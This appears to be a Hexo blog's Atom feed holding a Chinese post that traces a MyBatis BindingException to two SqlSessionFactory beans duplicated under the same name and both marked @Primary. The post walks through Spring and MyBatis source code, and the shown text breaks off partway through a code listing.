<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KL&#39;s blog</title>
  
  <subtitle>世事洞明皆学问，人情练达即文章</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qsli.github.io/"/>
  <updated>2020-04-29T05:10:58.956Z</updated>
  <id>http://qsli.github.io/</id>
  
  <author>
    <name>Kevin Leo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Spring中bean name重复的问题</title>
    <link href="http://qsli.github.io/2020/04/29/spring-bean-duplic-name/"/>
    <id>http://qsli.github.io/2020/04/29/spring-bean-duplic-name/</id>
    <published>2020-04-29T05:10:58.000Z</published>
    <updated>2020-04-29T05:10:58.956Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.atour.oss.dao.mapper.OssFileMapper.insert</span><br><span class="line"></span><br><span class="line">at org.apache.ibatis.binding.MapperMethod<span class="variable">$SqlCommand</span>.&lt;init&gt;(MapperMethod.java:227)</span><br><span class="line">at org.apache.ibatis.binding.MapperMethod.&lt;init&gt;(MapperMethod.java:49)</span><br><span class="line">at org.apache.ibatis.binding.MapperProxy.cachedMapperMethod(MapperProxy.java:65)</span><br><span class="line">at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:58)</span><br><span class="line">at com.sun.proxy.<span class="variable">$Proxy188</span>.insert(Unknown Source)</span><br></pre></td></tr></table></figure><p>一个同事新加了一个数据源，然后老的数据源居然报错了，他说没有改动老的。翻了下代码，最后发现是<strong>不加思索地复制粘贴</strong>埋的坑，老的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(basePackages = MapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 包目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PACKAGE = <span class="string">"com.atour.oss.dao.mapper"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_ALIASES_PACKAGE = <span class="string">"com.atour.oss.dao.entity"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mapper所在目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAPPER_LOCATION = <span class="string">"classpath*:mapper/oss/*.xml"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 参数配置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataSource 数据库信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource   配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> SqlSessionFactory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"sessionFactory"</span>)</span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">invitationSessionFactory</span><span class="params">(@Qualifier(<span class="string">"dataSource"</span>)</span> DataSource dataSource,</span></span><br><span class="line"><span class="function">        @<span class="title">Qualifier</span><span class="params">(<span class="string">"mybatisConf"</span>)</span> Resource resource) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        Resource[] mapperLocations = <span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(MAPPER_LOCATION);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(mapperLocations);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(TYPE_ALIASES_PACKAGE);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新加的代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(basePackages = NoticeIntelligenceMapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoticeIntelligenceMapperConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 包目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PACKAGE = <span class="string">"com.atour.noticeIntelligence.dao.mapper"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_ALIASES_PACKAGE = <span class="string">"com.atour.noticeIntelligence.dao.entity"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mapper所在目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAPPER_LOCATION = <span class="string">"classpath*:mapper/noticeIntelligence/*Mapper.xml"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 参数配置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataSource 数据库信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource   配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> SqlSessionFactory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"sessionFactory"</span>)</span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">invitationSessionFactory</span><span class="params">(@Qualifier(<span class="string">"dataSource"</span>)</span> DataSource dataSource,</span></span><br><span class="line"><span class="function">        @<span class="title">Qualifier</span><span class="params">(<span class="string">"mybatisConf"</span>)</span> Resource resource) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        Resource[] mapperLocations = <span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(MAPPER_LOCATION);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(mapperLocations);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(TYPE_ALIASES_PACKAGE);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意看bean的名字，完全一模一样！！！😂，目测spring在查找引用的时候错乱了。值得注意的是，俩bean还都标记上了<code>@Primary</code>。</p><h2 id="Primary"><a href="#Primary" class="headerlink" title="@Primary"></a>@Primary</h2><blockquote><pre><code>No matter how you designate a primary bean, the effect is the same. You’re telling</code></pre><p>Spring that it should choose the primary bean in the case of ambiguity.</p><pre><code>This works well right up to the point where you designate two or more primary</code></pre><p>beans.</p><pre><code>Now there are two primary Dessert beans: Cake and IceCream. This poses a new ambi</code></pre><p>guity issue. Just as Spring couldn’t choose among multiple candidate beans, it can’t</p><p>choose among multiple primary beans. Clearly, when more than one bean is desig</p><p>nated as primary, there are no primary candidates.</p><p>​                                                                —— 《Spring in action 4th Edition》</p></blockquote><p><strong>Clearly, when more than one bean is designated as primary, there are no primary candidates </strong></p><p>如果有多个<code>@Primary</code>注解的bean，那么就没有<code>primary</code>的candidate了；这里说的已经很明确了，但是没有说spring具体怎么处理的。毕竟上面的项目启动的时候也没有报<code>ambiguity</code> 相关的异常。</p><h2 id="MapperScan"><a href="#MapperScan" class="headerlink" title="MapperScan"></a>MapperScan</h2><p><code>MapperScan</code>是mybatis提供的注解，用来指定扫描dao层接口的目录和mapper文件所在的位置的注解，上面名字冲突的bean是通过下面的形式引入的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MapperScan</span>(basePackages = NoticeIntelligenceMapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br></pre></td></tr></table></figure><p>看下源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.mybatis.spring.annotation.MapperScannerRegistrar#registerBeanDefinitions</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinitions</span><span class="params">(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 省略n行</span></span><br><span class="line">    scanner.setSqlSessionTemplateBeanName(annoAttrs.getString(<span class="string">"sqlSessionTemplateRef"</span>));</span><br><span class="line">    <span class="comment">// 这里获取注解里对应的属性值</span></span><br><span class="line">    scanner.setSqlSessionFactoryBeanName(annoAttrs.getString(<span class="string">"sqlSessionFactoryRef"</span>));</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; basePackages = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String pkg : annoAttrs.getStringArray(<span class="string">"value"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(pkg)) &#123;</span><br><span class="line">        basePackages.add(pkg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (String pkg : annoAttrs.getStringArray(<span class="string">"basePackages"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(pkg)) &#123;</span><br><span class="line">        basePackages.add(pkg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; clazz : annoAttrs.getClassArray(<span class="string">"basePackageClasses"</span>)) &#123;</span><br><span class="line">      basePackages.add(ClassUtils.getPackageName(clazz));</span><br><span class="line">    &#125;</span><br><span class="line">    scanner.registerFilters();</span><br><span class="line">    scanner.doScan(StringUtils.toStringArray(basePackages));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>找到对应属性使用的地方：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.mybatis.spring.mapper.ClassPathMapperScanner#processBeanDefinitions</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processBeanDefinitions</span><span class="params">(Set&lt;BeanDefinitionHolder&gt; beanDefinitions)</span> </span>&#123;</span><br><span class="line">    GenericBeanDefinition definition;</span><br><span class="line">    <span class="keyword">for</span> (BeanDefinitionHolder holder : beanDefinitions) &#123;</span><br><span class="line">      definition = (GenericBeanDefinition) holder.getBeanDefinition();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        logger.debug(<span class="string">"Creating MapperFactoryBean with name '"</span> + holder.getBeanName() </span><br><span class="line">          + <span class="string">"' and '"</span> + definition.getBeanClassName() + <span class="string">"' mapperInterface"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// the mapper interface is the original class of the bean</span></span><br><span class="line">      <span class="comment">// but, the actual class of the bean is MapperFactoryBean</span></span><br><span class="line">      definition.getConstructorArgumentValues().addGenericArgumentValue(definition.getBeanClassName()); <span class="comment">// issue #59</span></span><br><span class="line">      definition.setBeanClass(<span class="keyword">this</span>.mapperFactoryBean.getClass());</span><br><span class="line"></span><br><span class="line">      definition.getPropertyValues().add(<span class="string">"addToConfig"</span>, <span class="keyword">this</span>.addToConfig);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">boolean</span> explicitFactoryUsed = <span class="keyword">false</span>;</span><br><span class="line">      <span class="comment">// 这里设置对应依赖的占位</span></span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionFactoryBeanName)) &#123;</span><br><span class="line">        <span class="comment">// 这里的RunTimeBean</span></span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionFactory"</span>, <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionFactoryBeanName));</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionFactory != <span class="keyword">null</span>) &#123;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionFactory"</span>, <span class="keyword">this</span>.sqlSessionFactory);</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionTemplateBeanName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">          logger.warn(<span class="string">"Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionTemplate"</span>, <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionTemplateBeanName));</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionTemplate != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">          logger.warn(<span class="string">"Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionTemplate"</span>, <span class="keyword">this</span>.sqlSessionTemplate);</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!explicitFactoryUsed) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">          logger.debug(<span class="string">"Enabling autowire by type for MapperFactoryBean with name '"</span> + holder.getBeanName() + <span class="string">"'."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.setAutowireMode(AbstractBeanDefinition.AUTOWIRE_BY_TYPE);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最终使用的是<code>RuntimeBeanReference</code>。</p><h2 id="RuntimeBeanReference"><a href="#RuntimeBeanReference" class="headerlink" title="RuntimeBeanReference"></a>RuntimeBeanReference</h2><p><code>@Primary</code>注解最终转换成了bean的<code>isPrimary</code>属性，搜代码可以大概知道是在<code>DefaultListableBeanFactory</code>中处理的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.beans.factory.support.DefaultListableBeanFactory#determinePrimaryCandidate</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Determine the primary candidate in the given set of beans.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> candidates a Map of candidate names and candidate instances</span></span><br><span class="line"><span class="comment"> * (or candidate classes if not created yet) that match the required type</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> requiredType the target dependency type to match against</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the name of the primary candidate, or &#123;<span class="doctag">@code</span> null&#125; if none found</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #isPrimary(String, Object)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">determinePrimaryCandidate</span><span class="params">(Map&lt;String, Object&gt; candidates, Class&lt;?&gt; requiredType)</span> </span>&#123;</span><br><span class="line">String primaryBeanName = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : candidates.entrySet()) &#123;</span><br><span class="line">String candidateBeanName = entry.getKey();</span><br><span class="line">Object beanInstance = entry.getValue();</span><br><span class="line"><span class="keyword">if</span> (isPrimary(candidateBeanName, beanInstance)) &#123;</span><br><span class="line"><span class="keyword">if</span> (primaryBeanName != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">boolean</span> candidateLocal = containsBeanDefinition(candidateBeanName);</span><br><span class="line"><span class="keyword">boolean</span> primaryLocal = containsBeanDefinition(primaryBeanName);</span><br><span class="line"><span class="keyword">if</span> (candidateLocal &amp;&amp; primaryLocal) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> NoUniqueBeanDefinitionException(requiredType, candidates.size(),</span><br><span class="line"><span class="string">"more than one 'primary' bean found among candidates: "</span> + candidates.keySet());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (candidateLocal) &#123;</span><br><span class="line">primaryBeanName = candidateBeanName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">primaryBeanName = candidateBeanName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> primaryBeanName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这里抛异常了，应该不是这里 🙄</p><blockquote><p>首先是信息解析，即将属性定义中的值进行解析，如RuntimeBeanReference解析成引用的Bean对象，这里会进行级联获取bean信息，并追加depend信息。这一步只是解析。</p></blockquote><p>原来在这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.beans.factory.support.BeanDefinitionValueResolver#resolveValueIfNecessary</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given a PropertyValue, return a value, resolving any references to other</span></span><br><span class="line"><span class="comment"> * beans in the factory if necessary. The value could be:</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A BeanDefinition, which leads to the creation of a corresponding</span></span><br><span class="line"><span class="comment"> * new bean instance. Singleton flags and names of such "inner beans"</span></span><br><span class="line"><span class="comment"> * are always ignored: Inner beans are anonymous prototypes.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A RuntimeBeanReference, which must be resolved.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A ManagedList. This is a special collection that may contain</span></span><br><span class="line"><span class="comment"> * RuntimeBeanReferences or Collections that will need to be resolved.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A ManagedSet. May also contain RuntimeBeanReferences or</span></span><br><span class="line"><span class="comment"> * Collections that will need to be resolved.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A ManagedMap. In this case the value may be a RuntimeBeanReference</span></span><br><span class="line"><span class="comment"> * or Collection that will need to be resolved.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;An ordinary object or &#123;<span class="doctag">@code</span> null&#125;, in which case it's left alone.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> argName the name of the argument that the value is defined for</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value the value object to resolve</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the resolved object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">resolveValueIfNecessary</span><span class="params">(Object argName, @Nullable Object value)</span> </span>&#123;</span><br><span class="line"><span class="comment">// We must check each value to see whether it requires a runtime reference</span></span><br><span class="line"><span class="comment">// to another bean to be resolved.</span></span><br><span class="line"><span class="keyword">if</span> (value <span class="keyword">instanceof</span> RuntimeBeanReference) &#123;</span><br><span class="line">      <span class="comment">// 在这里处理的！！！</span></span><br><span class="line">RuntimeBeanReference ref = (RuntimeBeanReference) value;</span><br><span class="line"><span class="keyword">return</span> resolveReference(argName, ref);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> RuntimeBeanNameReference) &#123;</span><br><span class="line">String refName = ((RuntimeBeanNameReference) value).getBeanName();</span><br><span class="line">refName = String.valueOf(doEvaluate(refName));</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.beanFactory.containsBean(refName)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(</span><br><span class="line"><span class="string">"Invalid bean name '"</span> + refName + <span 